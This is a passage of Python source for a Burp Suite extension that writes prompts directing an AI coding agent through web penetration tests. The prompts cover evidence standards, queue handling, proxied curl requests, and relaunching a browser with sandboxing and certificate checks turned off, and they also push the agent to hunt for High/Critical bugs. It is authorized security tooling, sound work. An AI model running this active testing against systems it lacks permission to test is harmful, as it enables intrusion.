            "- Host header injection without cache poisoning, password reset poisoning, or routing impact\n"
            "- Theoretical race conditions you couldn't actually trigger\n"
            "- Outdated library version without exploitable code path demonstrated\n"
            "If a finding is in this list, mark it agent_status=false_positive with set_fp=true and move on; normal findings/report views hide these non-reportable items.\n"
            "\n"
            "=== EVIDENCE STANDARDS (non-negotiable) ===\n"
            "- 'confirmed' MUST cite: exact request, status code, response snippet proving the claim, repro steps.\n"
            "- 'not-vulnerable' MUST list what was tried and how the server defended.\n"
            "- 'inconclusive' for ambiguous responses - do NOT upgrade to confirmed.\n"
            "- For chains: document each link, the pivot, and the final impact achieved.\n"
            "- Never claim a vuln you didn't actually trigger in a request you sent.\n"
        )

    def _build_agent_resume_prompt(self, url):
        """Build a short prompt for continuing an existing assessment."""
        return (
            "=== DOUBLE AGENT - RESUME EXISTING ASSESSMENT ===\n"
            "Use this when continuing a Burp/Double Agent assessment after a break, restart, or dropped agent session.\n\n"
            "Base URL: " + url + "\n"
            "Authentication: none; this API is loopback-only.\n\n"
            "GOAL: Get current state, avoid repeating completed work, then continue the highest-value pending item.\n\n"
            "ROLE: Continue as Agent B, the expert Burp Suite operator. Fetch /api/agent/burp/skill and follow combined_markdown as $burpsuite-operator; no local skill folder is required. Prefer normalized /api/agent/burp actions over raw MCP calls, and never invent an unavailable capability.\n\n"
            "USER SHORTCUT: If the user sends 'q', 'fetch q', or 'fetch q from Burp', this means fetch the Double Agent work queue from Burp and start/continue queue workflow. It does NOT mean quit. Run GET /api/agent/queue, continue any claimed item that matches the user's context or claim the highest-value pending item, then GET /api/agent/queue/<id> and follow next_action.\n\n"
            "RESUME STEPS:\n"
            "1. Verify API/docs:\n"
            "   curl -s " + url + "/api/health && curl -s '" + url + "/api/docs?compact=true'\n"
            "2. Load the API-delivered Burp skill:\n"
            "   curl -s " + url + "/api/agent/burp/skill | jq -r .combined_markdown\n"
            "3. Rehydrate assessment state:\n"
            "   curl -s '" + url + "/api/agent/burp/capabilities?refresh=true'\n"
            "   curl -s '" + url + "/api/agent/burp/workspace?compact=true'\n"
            "   curl -s " + url + "/api/agent/preflight\n"
            "   curl -s " + url + "/api/findings\n"
            "   curl -s " + url + "/api/agent/knowledge\n"
            "   curl -s " + url + "/api/agent/fixtures\n"
            "   curl -s " + url + "/api/agent/confirmations\n"
            "   curl -s " + url + "/api/agent/queue\n"
            "   curl -s " + url + "/api/coverage\n"
            "4. Triage only new/untouched/changed findings. Use agent_candidate_type: reportable_candidate first, needs_fixture only after fixture_status is ready, theory_only only if cheap/user-requested, scanner_noise normally skip.\n"
            "5. Select the matching claimed item first, otherwise the highest-value pending item. GET /api/agent/queue/<id>, inspect mode and next_action, then claim it if pending.\n"
            "6. Restore persistent Try Harder goal before any further work:\n"
            "   - If mode=try_harder, call get_goal immediately. If it returns a matching active goal, reuse it and continue; never create a duplicate.\n"
            "   - If no goal exists, call create_goal exactly once using persistent_agent_goal.objective. For a legacy active Try Harder item without that field, use its risk_hunt.objective plus the queue ID; the user's original Try Harder action is the explicit authorization.\n"
            "   - If a different unfinished goal is active, do not overwrite or falsely complete it; report the goal conflict and request direction.\n"
            "   - Keep the matching goal active while the item is claimed or /result is rejected. Complete it only after /result succeeds. risk_hunt_goals are separate.\n"
            "7. BrowserOS MCP recovery for browser_verify=true or browser-dependent campaigns: if BrowserOS MCP tools are missing, call curl -s " + url + "/api/docs and read browseros_mcp_setup. Then kill existing BrowserOS instances first, launch BrowserOS through Burp Proxy in debugging mode, register the MCP, and re-check tools.\n"
            "   macOS: pkill -f BrowserOS 2>/dev/null || true; pkill -f browseros 2>/dev/null || true; sleep 1; open -na 'BrowserOS' --args --proxy-server=127.0.0.1:8080 '--proxy-bypass-list=<-loopback>' --remote-debugging-port=9100 --user-data-dir=/tmp/browseros-profile --ignore-certificate-errors\n"
            "   Kali/Linux cleanup: set +e; pkill -9 -f '/usr/lib/browseros/browseros' 2>/dev/null || true; pkill -9 -f browseros_server 2>/dev/null || true; rm -f /tmp/browseros-profile/Singleton* /tmp/browseros-profile/browseros/server.lock 2>/dev/null || true\n"
            "   Kali/Linux launch: use Bash background/run_in_background support with: exec /usr/lib/browseros/browseros --no-sandbox --proxy-server=http://127.0.0.1:8080 '--proxy-bypass-list=<-loopback>' --remote-debugging-port=9100 --user-data-dir=/tmp/browseros-profile --disable-gpu --ignore-certificate-errors\n"
            "   Register: claude mcp list 2>/dev/null | grep -i browseros || claude mcp add --transport http browseros http://127.0.0.1:9000/mcp --scope user\n"
            "   If registration succeeds but tools are still absent in the current Claude Code session, try a fresh Claude Code session. If a fresh session still has no callable BrowserOS tools but http://127.0.0.1:9000/mcp is healthy and tools/list returns BrowserOS tools, use local BrowserOS MCP JSON-RPC fallback instead of blocking. Local MCP control curl uses --noproxy '*' and is exempt from target proxy rules; browser traffic still routes through Burp from the launched BrowserOS process.\n"
            "8. For curl-capable target work, do not hand-build first: GET /api/agent/queue/<id>/curl?refresh_auth=true and run the generated command exactly. For source=risk_hunt automated testing, do not call /curl; hand-build only scoped Burp-proxied requests with X-Eternals-Agent-Note. Every target curl must include -x http://127.0.0.1:8080 and X-Eternals-Agent-Note.\n"
            "9. If blocked by missing A/B account, account_number, object, tenant, MFA, OTP/SMS/email evidence, POST /api/agent/queue/<id>/result with outcome=blocked-by-missing-fixture and list next_action.fixture_status.missing.\n"
            "10. If no pending item is higher value than active validation, queue or ask the user to queue automated testing: POST /api/agent/queue/automated-testing. For source=risk_hunt Automated Testing, verify visible Agent A findings not yet tested by Agent B; one completed category=linked_validation goal is acceptable if every linked finding is updated or Gated.\n"
            "   If the user asks to 'try harder' or wants a stronger solo bug hunt, queue or claim POST /api/agent/queue/try-harder. Immediately follow persistent_agent_goal: call get_goal and create_goal exactly once if needed before testing; keep it active until /result succeeds. Then build a threat model, try to find one previously undiscovered High/Critical bug, and stop immediately after it is confirmed and posted or after the new_discovery negative-result/Gated conditions are satisfied.\n"
            "11. Submit results to /api/agent/queue/<id>/result with exact request/response evidence. Do not claim confirmed unless you actually triggered and observed it. If accepted and persistent_goal_next_action is returned, call update_goal(status=complete).\n\n"
            "REMINDERS:\n"
            "- Local Double Agent API curl calls do not use Burp proxy. Target application curl calls must use -x http://127.0.0.1:8080.\n"
            "- Confirmed new vulnerabilities must be written with POST /api/findings; /api/report renders the markdown from the findings list.\n"
            "- Use /api/agent/knowledge for durable target notes, assumptions, tested controls, blockers, and risk leads instead of relying on chat memory.\n"
            "- Before asking for auth, call /api/agent/auth/latest?host=<host>&include_related=true and use recommended_auth.raw_header_lines.\n"
            "- For browser_verify=true, use BrowserOS MCP through Burp proxy, not curl. If tools are missing, fetch /api/docs and follow browseros_mcp_setup before asking the user.\n"
            "- For HTTP/2-sensitive behavior, use /api/agent/request/http2. If port 9876 is reachable but discovery timed out, make one actual endpoint attempt; it uses a fresh MCP session and one reconnect retry. Do not block on discovery alone or downgrade to HTTP/1.1.\n"
            "- If the user says 'q' during a resumed session, interpret it as 'fetch queue from Burp now' and proceed with queue selection; do not ask whether q means quit.\n"
            "- Report a concise resume summary before active testing: pending queue count, fixture readiness, highest-priority item, and any blockers.\n"
        )

    # Keys that MUST be per-project only (findings, FP state, agent queue).
    # These will never read from global extension storage, so switching Burp
    # projects starts with a clean slate.
    _PROJECT_ONLY_KEYS = ("eternals_findings", "eternals_agent_queue")

    def _project_key(self):
        """Stable assessment marker derived from the selected project folder.

        Temporary Burp projects do not reliably retain project settings across
        extension reloads. The explicitly selected workspace is therefore the
        durable assessment namespace.
        """
        try:
            if not hasattr(self, "_project_key_cache") or not self._project_key_cache:
                workspace = os.path.realpath(os.path.abspath(self._workspace_directory()))
                normalized = os.path.normcase(workspace).encode("utf-8", "replace")
                self._project_key_cache = hashlib.sha256(
                    b"double-agent-workspace\x00" + normalized).hexdigest()[:12]
            return self._project_key_cache
        except Exception:
            return "default"

    def _disk_fallback_path(self, key):
        """Path to the disk fallback file for a project-only key."""
        try:
            import os
            base = os.path.join(os.path.expanduser("~"), ".eternals")
            if not os.path.isdir(base):
                try:
                    os.makedirs(base)
                except Exception:
                    pass
            return os.path.join(base, "%s_%s.json" % (key, self._project_key()))
        except Exception:
            return None

    def _sanitize_persisted_value(self, value):
        """Redact live authentication material before writing assessment sidecars."""
        if bool(getattr(self, "PERSIST_RAW_HTTP", False)):
            return value
        if isinstance(value, dict):
            return dict((key, self._sanitize_persisted_value(item)) for key, item in value.items())
        if isinstance(value, list):
            return [self._sanitize_persisted_value(item) for item in value]
        if isinstance(value, tuple):
            return [self._sanitize_persisted_value(item) for item in value]
        try:
            if isinstance(value, basestring):
                return redact_sensitive_http_text(value)
        except Exception:
            if isinstance(value, str):
                return redact_sensitive_http_text(value)
        return value

    # =========================================================================
    # Primary persistence: double-agent.json sidecar file in the working directory.
    # This is the source of truth. Burp project storage is only a legacy
    # fallback because it failed too often for large payloads / temp projects.
    # =========================================================================

    _SIDECAR_FILE_NAME = "double-agent.json"
    _ETERNALS_FILE_NAME = "eternals.json"  # legacy import name

    def _eternals_file_name(self):
        """Canonical sidecar inside the explicitly selected project folder."""
        return self._SIDECAR_FILE_NAME

    def _normalized_authority(self, url):
        try:
            parsed = urlparse.urlparse(str(url or ""))
            scheme = str(parsed.scheme or "http").lower()
            host = str(parsed.hostname or "").lower()
            if not host:
                return ""
            port = parsed.port
            if port is None:
                port = 443 if scheme == "https" else 80
            return "%s://%s:%d" % (scheme, host, int(port))
        except Exception:
            return ""

    def _is_swing_event_thread(self):
        try:
            return bool(SwingUtilities.isEventDispatchThread())
        except Exception:
            return False

    def _schedule_site_map_snapshot_refresh(self):
        lock = getattr(self, "_site_map_snapshot_lock", None)
        if lock is None:
            return False
        with lock:
            if bool(getattr(self, "_site_map_refresh_in_progress", False)):
                return False
            self._site_map_refresh_in_progress = True

        def refresh_snapshot():
            try:
                self._get_burp_site_map_snapshot(force=True)
                # Compute Burp-authoritative scoped authorities on this worker
                # too. Swing consumers may read the result, but must never call
                # isInScope() themselves while rendering.
                self._current_burp_context_authorities()
            finally:
                with lock:
                    self._site_map_refresh_in_progress = False
                self._engagement_context_cache = None
                self._ui_dirty = True

        worker = threading.Thread(target=refresh_snapshot, name="double-agent-site-map-snapshot")
        worker.setDaemon(True)
        worker.start()
        return True
